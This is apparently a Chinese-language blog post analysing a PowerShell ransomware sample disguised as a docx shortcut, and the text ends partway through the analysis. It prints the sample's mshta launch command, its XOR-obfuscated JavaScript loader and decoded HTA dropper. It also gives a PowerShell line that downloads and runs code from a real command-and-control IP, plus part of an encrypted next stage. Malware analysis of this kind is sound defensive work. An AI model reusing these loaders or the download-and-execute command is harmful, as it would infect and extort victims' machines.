<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Powershell勒索病毒 | Richardo</title><meta name="keywords" content="powershell病毒"><meta name="author" content="Richardo.M"><meta name="copyright" content="Richardo.M"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="分析一个多重混淆的powershell病毒">
<meta property="og:type" content="article">
<meta property="og:title" content="Powershell勒索病毒">
<meta property="og:url" content="https://richard447.github.io/2020/07/20/%E4%B8%80%E4%B8%AA%E5%A4%9A%E5%B1%82%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84powershell%E6%9C%A8%E9%A9%AC&%E5%8B%92%E7%B4%A2%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/index.html">
<meta property="og:site_name" content="Richardo">
<meta property="og:description" content="分析一个多重混淆的powershell病毒">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://overwatch.nosdn.127.net/2/media/screenshots/brigitte-screenshot-01_n2d31.jpg">
<meta property="article:published_time" content="2020-07-19T16:00:00.000Z">
<meta property="article:modified_time" content="2021-03-06T16:00:00.000Z">
<meta property="article:author" content="Richardo.M">
<meta property="article:tag" content="勒索病毒">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://overwatch.nosdn.127.net/2/media/screenshots/brigitte-screenshot-01_n2d31.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://richard447.github.io/2020/07/20/%E4%B8%80%E4%B8%AA%E5%A4%9A%E5%B1%82%E5%8A%A0%E5%AF%86%E6%B7%B7%E6%B7%86%E7%9A%84powershell%E6%9C%A8%E9%A9%AC&amp;%E5%8B%92%E7%B4%A2%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Powershell勒索病毒',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2021-03-07 00:00:00'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/self_icon.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://overwatch.nosdn.127.net/2/media/screenshots/junkertown-screenshot-001.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Richardo</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Powershell勒索病毒</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-07-19T16:00:00.000Z" title="发表于 2020-07-20 00:00:00">2020-07-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-06T16:00:00.000Z" title="更新于 2021-03-07 00:00:00">2021-03-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90/">恶意软件分析</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Powershell勒索病毒"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="powershell勒索病毒"><a href="#powershell勒索病毒" class="headerlink" title="powershell勒索病毒"></a>powershell勒索病毒</h1><p>[toc]</p>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        偶然在twitter上发现这个使用powershell脚本完成勒索的软件，样本里面采用了多层混淆、压缩、加密，并且核心的驻留程序和文件加密程序全部都是powershell脚本，在勒索病毒中实属少见。</p>
<h4 id="样本基础信息"><a href="#样本基础信息" class="headerlink" title="样本基础信息"></a>样本基础信息</h4><table>
<thead>
<tr>
<th><strong>Name</strong></th>
<th><strong>N-388-30.06.2020.docx</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Size</strong></td>
<td><strong>62387 bytes</strong></td>
</tr>
<tr>
<td><strong>MD5</strong></td>
<td><strong>7B5F028144AA35AFDF9F4835FA5432B8</strong></td>
</tr>
<tr>
<td><strong>SHA1</strong></td>
<td><strong>8BF59BAF6A003C279E95540BFB92149F6F0BA668</strong></td>
</tr>
</tbody>
</table>
<h4 id="详细分析"><a href="#详细分析" class="headerlink" title="详细分析"></a>详细分析</h4><ul>
<li>从<a target="_blank" rel="noopener" href="https://app.any.run/tasks/ba79f055-2be3-41eb-ac6f-4c27692ef92d/">AnyRun</a>上拿到样本，解压，样本的本体是一个lnk快捷方式文件，并且从属性中可得到其执行的目标命令：</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713141853410.png" alt="image-20200713141853410"></p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">%comspec%</span> /v /c <span class="built_in">set</span> m=m^s^h^ta &amp;&amp; <span class="built_in">set</span> a=N-<span class="number">388</span>-^<span class="number">30</span>.<span class="number">06</span>.^<span class="number">2020</span>.^docx.l^nk &amp;&amp; <span class="keyword">if</span> <span class="keyword">exist</span> &quot;<span class="variable">!cd!</span>\<span class="variable">!a!</span>&quot; (<span class="variable">!m!</span> &quot;<span class="variable">!cd!</span>\<span class="variable">!a!</span>&quot;) <span class="keyword">else</span> (<span class="variable">!m!</span> &quot;<span class="variable">!temp!</span>\Temp1_За^прос.z^ip\<span class="variable">!a!</span>&quot;)</span><br></pre></td></tr></table></figure>
<ul>
<li><p>分析其命令，在打开该快捷方式的时候将使用mshta来打开样本文件，mshta可以打开并运行hta文件，能够识别文件中的html标签并执行js脚本，使用010和notepad打开样本，发现其实际显示的是system32下的cmd.exe的文件数据，这是因为快捷方式的目标中使用<code>%comspec%</code>将文件指向了cmd.exe，所以无法查看到源文件的数据</p>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713153128587.png" alt="image-20200713153128587"></p>
</li>
<li><p>有趣的是，使用pestudio打开该文件，发现其中有一串javascript的代码，如果mshta解析到这串数据，应该会执行这段代码。分析这串代码：</p>
</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713165441139.png" alt="image-20200713165441139"></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">qUpYe</span>(<span class="params">hEKWD,KKuEc</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> xxQKS=[];<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;hEKWD.length;i+=<span class="number">1</span>)&#123;</span><br><span class="line">        xxQKS.push(<span class="built_in">String</span>.fromCharCode(hEKWD[i]^KKuEc.charCodeAt(i%KKuEc.length)))</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> xxQKS.join(<span class="string">&quot;&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">eval</span>(qUpYe(<span class="string">&quot;17Qop38Qop58Qop34Qop9Qop56Qop122Qop52Qop3Qop60Qop61Qop60Qop3Qop27Qop59Qop110Qop86Qop99Qop100Qop111Qop93Qop66Qop94Qop48Qop7Qop61Qop116Qop53Qop3Qop63Qop53Qop52Qop7Qop59Qop59Qop52Qop70Qop114Qop116Qop100Qop62*****(省略后续数据)&quot;</span>.split(<span class="string">&#x27;Qop&#x27;</span>), <span class="string">&quot;fOTF&quot;</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>代码中有一个解密函数qUpYe，将固定的这串字符串解密然后用eval函数执行，在浏览器中调试，获得解密后的数据:</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;window.resizeTo(0,0);   ##设置窗口大小不可见</span></span><br><span class="line"><span class="string">var separator = &quot;</span>XUNDAdTsTpfETGe<span class="string">&quot;;  ##脚本定位符</span></span><br><span class="line"><span class="string">var originalextension = &quot;</span>.lnk<span class="string">&quot;;</span></span><br><span class="line"><span class="string">var toexecute = &quot;</span>-nop -c <span class="keyword">while</span>(!(.(\<span class="string">&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;&#123;2&#125;\&quot;\&quot;\&quot;-f (\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f &#x27;st-&#x27;,&#x27;Te&#x27;),(\&quot;\&quot;\&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f &#x27;ec&#x27;,&#x27;onn&#x27;,&#x27;C&#x27;),(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f&#x27;n&#x27;,&#x27;tio&#x27;)) (\&quot;\&quot;\&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f (\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot;-f(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f&#x27;.c&#x27;,&#x27;le&#x27;),&#x27;om&#x27;),&#x27;g&#x27;,&#x27;oog&#x27;) -q)) &#123;&amp;(\&quot;\&quot;\&quot;&#123;1&#125;&#123;2&#125;&#123;0&#125;&#123;3&#125;\&quot;\&quot;\&quot; -f (\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot; -f(\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot; -f &#x27;a&#x27;,&#x27;rt-&#x27;),&#x27;Sl&#x27;),&#x27;S&#x27;,&#x27;t&#x27;,&#x27;eep&#x27;) -s 5&#125; .(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f&#x27;ex&#x27;,&#x27;i&#x27;)(.(\&quot;\&quot;\&quot;&#123;2&#125;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f&#x27;t&#x27;,(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f &#x27;jec&#x27;,&#x27;Ob&#x27;),(\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot; -f&#x27;Ne&#x27;,&#x27;w-&#x27;)) (\&quot;\&quot;\&quot;&#123;0&#125;&#123;4&#125;&#123;1&#125;&#123;2&#125;&#123;3&#125;\&quot;\&quot;\&quot;-f (\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f &#x27;W&#x27;,(\&quot;\&quot;\&quot;&#123;0&#125;&#123;1&#125;\&quot;\&quot;\&quot;-f &#x27;Net&#x27;,&#x27;.&#x27;)),&#x27;C&#x27;,&#x27;li&#x27;,&#x27;ent&#x27;,&#x27;eb&#x27;)).(\&quot;\&quot;\&quot;&#123;3&#125;&#123;4&#125;&#123;1&#125;&#123;2&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f&#x27;ing&#x27;,(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot;-f&#x27;lo&#x27;,&#x27;wn&#x27;),(\&quot;\&quot;\&quot;&#123;1&#125;&#123;0&#125;\&quot;\&quot;\&quot; -f &#x27;Str&#x27;,&#x27;ad&#x27;),&#x27;D&#x27;,&#x27;o&#x27;).\&quot;\&quot;\&quot;In`Vo`kE\&quot;\&quot;\&quot;((\&quot;\&quot;\&quot;http://45.61.138.170/decide.php\&quot;\&quot;\&quot;))&quot;</span>; ##所执行命令</span><br><span class="line"><span class="keyword">var</span> currentfile = <span class="built_in">decodeURIComponent</span>(<span class="built_in">window</span>.document.location.pathname);</span><br><span class="line"><span class="keyword">var</span> fso = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Scripting.FileSystemObject&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> shell = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Shell.Application&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">DeleteSelf</span>(<span class="params"></span>) </span>&#123;  ##文件自删除</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		fso.DeleteFile(currentfile);</span><br><span class="line">	&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">		<span class="keyword">var</span> deletselfstring = <span class="string">&quot;/c ping 127.0.0.1 -n 1 &amp; DEL \&quot;&quot;</span> + <span class="built_in">window</span>.document.location.pathname + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">		shell.ShellExecute(<span class="string">&quot;cmd.exe&quot;</span>, deletselfstring, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ReadSelf</span>(<span class="params"></span>) </span>&#123;  ##读取自身文件数据</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		file = fso.GetFile(currentfile);</span><br><span class="line">		ln = file.Size;</span><br><span class="line">		ts = file.OpenAsTextStream(<span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">		content = ts.Read(ln);</span><br><span class="line">		ts.Close();</span><br><span class="line">		<span class="keyword">return</span> content;</span><br><span class="line">	&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;		</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExtractRealDocData</span>(<span class="params">content</span>) </span>&#123;  ##提取文件数据</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		tmp = content.split(separator);</span><br><span class="line">		<span class="keyword">return</span> tmp[<span class="number">1</span>];</span><br><span class="line">	&#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SaveAndRunDoc</span>(<span class="params">doc</span>) </span>&#123;  ##保存数据到文件</span><br><span class="line">	<span class="keyword">try</span>&#123;</span><br><span class="line">		savepath = currentfile.split(originalextension).join(<span class="string">&quot;&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span>(savepath.indexOf(<span class="string">&quot;Temp1_&quot;</span>) !== -<span class="number">1</span>) &#123;</span><br><span class="line">			savepath = fso.GetSpecialFolder(<span class="number">2</span>) + <span class="string">&quot;\\&quot;</span> + fso.GetFilename(savepath);</span><br><span class="line">		&#125;</span><br><span class="line">		file = fso.CreateTextFile(savepath);</span><br><span class="line">		file.Write(doc);</span><br><span class="line">		file.Close();</span><br><span class="line">		shell.ShellExecute(savepath);</span><br><span class="line">	&#125; <span class="keyword">catch</span>(e) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ExecutePowershell</span>(<span class="params"></span>) </span>&#123;   ##调用powershell</span><br><span class="line">	shell.ShellExecute(<span class="string">&quot;powershell.exe&quot;</span>, toexecute, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Main</span>(<span class="params"></span>) </span>&#123;   ##主函数</span><br><span class="line">	SaveAndRunDoc(ExtractRealDocData(ReadSelf()));</span><br><span class="line">	ExecutePowershell();</span><br><span class="line">	DeleteSelf();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	Main();</span><br><span class="line">&#125; <span class="keyword">catch</span>(e) &#123;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">window</span>.close();<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>执行这段脚本，将读取自身的脚本数据然后保存到同名doc文件下，打开该doc文件来欺骗用户并完成自删除，实际上其核心的攻击是执行的一段powershell脚本，这里附一张Process Monitor的进程执行截图。</li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713172255584.png" alt="image-20200713172255584"></p>
<ul>
<li>powershell脚本中使用字符替换来做混淆，整理如下，在测试网络可联通google时将从C2上下载代码并执行</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(!(.(<span class="built_in">Test-Connection</span>) (<span class="string">&quot;google.com&quot;</span>) <span class="literal">-q</span>)) </span><br><span class="line">&#123;</span><br><span class="line">&amp;(<span class="built_in">Start-Sleep</span>) <span class="literal">-s</span> <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line">.(<span class="built_in">iex</span>)(.(<span class="built_in">New-Object</span> net.WebClient)).downloadString.InVokE(<span class="string">&quot;http://45.61.138.170/decide.php&quot;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>C2(<a target="_blank" rel="noopener" href="http://45.61.138.170/decide.php)的数据如下，可以看出是一个powershell脚本，并且含有大量的混淆，将该文件下载整理分析">http://45.61.138.170/decide.php)的数据如下，可以看出是一个powershell脚本，并且含有大量的混淆，将该文件下载整理分析</a></li>
</ul>
<p><img src="https://gitee.com/recird/blogimages/raw/master/img/image-20200713174457688.png" alt="image-20200713174457688"></p>
<ul>
<li>代码如下，其功能为：使用powershell中的安全字符串，解密已经被加密好的数据</li>
</ul>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$5Kp</span> =  [<span class="type">TyPe</span>](<span class="string">&quot;&#123;2&#125;&#123;3&#125;&#123;1&#125;&#123;5&#125;&#123;4&#125;&#123;0&#125;&quot;</span><span class="operator">-F</span><span class="string">&#x27;VIceS.mARSHaL&#x27;</span>,<span class="string">&#x27;iNTe&#x27;</span>,<span class="string">&#x27;ruNtiMe&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;Opser&#x27;</span>,<span class="string">&#x27;r&#x27;</span>);  &amp;amp;</span><br><span class="line">(<span class="string">&quot;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&#123;4&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;voKe&#x27;</span>,<span class="string">&#x27;XPre&#x27;</span>,<span class="string">&#x27;-e&#x27;</span>,<span class="string">&#x27;iN&#x27;</span>,<span class="string">&#x27;sSion&#x27;</span>) <span class="comment">#iex</span></span><br><span class="line">((  ( <span class="built_in">GEt-VariABlE</span>  (<span class="string">&#x27;5K&#x27;</span>+<span class="string">&#x27;P&#x27;</span>)).ValuE::<span class="string">&quot;p`Trtos`TRINgA`NsI&quot;</span>(  ( <span class="built_in">lS</span>  (<span class="string">&quot;V&quot;</span>+<span class="string">&quot;a&quot;</span>+<span class="string">&quot;riABl&quot;</span>+<span class="string">&quot;E:5Kp&quot;</span>) ).ValuE::(<span class="string">&quot;&#123;4&#125;&#123;3&#125;&#123;0&#125;&#123;2&#125;&#123;1&#125;&quot;</span><span class="operator">-f</span><span class="string">&#x27;NGtO&#x27;</span>,<span class="string">&#x27;locanSi&#x27;</span>,<span class="string">&#x27;GlObAlAl&#x27;</span>,<span class="string">&#x27;TrI&#x27;</span>,<span class="string">&#x27;secUrEs&#x27;</span>).Invoke( <span class="variable">$</span>((<span class="string">&quot;&#123;28&#125;&#123;11&#125;&#123;33&#125;&#123;3&#125;&#123;17&#125;&#123;24&#125;&#123;6&#125;&#123;22&#125;&#123;9&#125;&#123;21&#125;&#123;1&#125;&#123;20&#125;&#123;31&#125;&#123;7&#125;&#123;2&#125;&#123;32&#125;&#123;16&#125;&#123;35&#125;&#123;12&#125;&#123;34&#125;&#123;19&#125;&#123;4&#125;&#123;10&#125;&#123;14&#125;&#123;0&#125;&#123;5&#125;&#123;26&#125;&#123;8&#125;&#123;29&#125;&#123;23&#125;&#123;36&#125;&#123;18&#125;&#123;13&#125;&#123;27&#125;&#123;15&#125;&#123;25&#125;&#123;37&#125;&#123;30&#125;&quot;</span><span class="operator">-f</span> <span class="string">&#x27;ADMAYQBiAGIANQBkADAANQA2ADkAOABkAGEAMAA1ADgAYgAxADUANAAzAGYAYwBhADIAOAAzADgAMQAzADgAOAA5AGQAMwBmAGMAYgA5ADEAZgBiAGEAYQA1ADgAMQAwADUAOABlAGMAOAA4ADQAZQBkAGEAZABlADYAYgA4ADMAZgBiAGIANwA0ADAANwBjADIANgA5ADcAZgAwADEAYQA4ADYANQA2ADUAYQBhAGQAYwBmAGMANgA2ADkAMwA2ADcANQAwAGQAZQBiAGUAOQAzAGQAOQAyAGIAZQBiADkAYwAzAGIAZAA3ADkAOQA1ADMAMQA5ADUAMgAxAGIAMgA2AGUAMQBlAGUAZAAyADMAOQAxADgANQBjAGMAYwA2AGEAOQA5ADkAMwBjADcAMwA0AGYANQAyADYAMQBmADgAYgBmADEANwA0AGYAYgA4AGIAMQA2AGUAZgBkAGMAOAA0AGQAMABjADAAOQBiAGEANwBiAGUAMwBlADgANwA4ADQANgA1ADUANABhAGEANQBmADMAZQBhADcAYwBjAGIANwBjA.....(省略后续数据)&#x27;</span>)|&amp;amp;(<span class="string">&quot;&#123;2&#125;&#123;4&#125;&#123;1&#125;&#123;3&#125;&#123;0&#125;&#123;5&#125;&quot;</span> <span class="operator">-f</span> <span class="string">&#x27;cUres&#x27;</span>,<span class="string">&#x27;vERtt&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;O-Se&#x27;</span>,<span class="string">&#x27;On&#x27;</span>,<span class="string">&#x27;TRing&#x27;</span>)  <span class="literal">-K</span>  <span class="number">183</span>,<span class="number">152</span>,<span class="number">180</span>,<span class="number">14</span>,<span class="number">142</span>,<span class="number">135</span>,<span class="number">92</span>,<span class="number">101</span>,<span class="number">124</span>,<span class="number">195</span>,<span class="number">69</span>,<span class="number">160</span>,<span class="number">230</span>,<span class="number">251</span>,<span class="number">217</span>,<span class="number">167</span>,<span class="number">15</span>,<span class="number">114</span>,<span class="number">183</span>,<span class="number">165</span>,<span class="number">92</span>,<span class="number">54</span>,<span class="number">231</span>,<span class="number">228</span>) ) ) 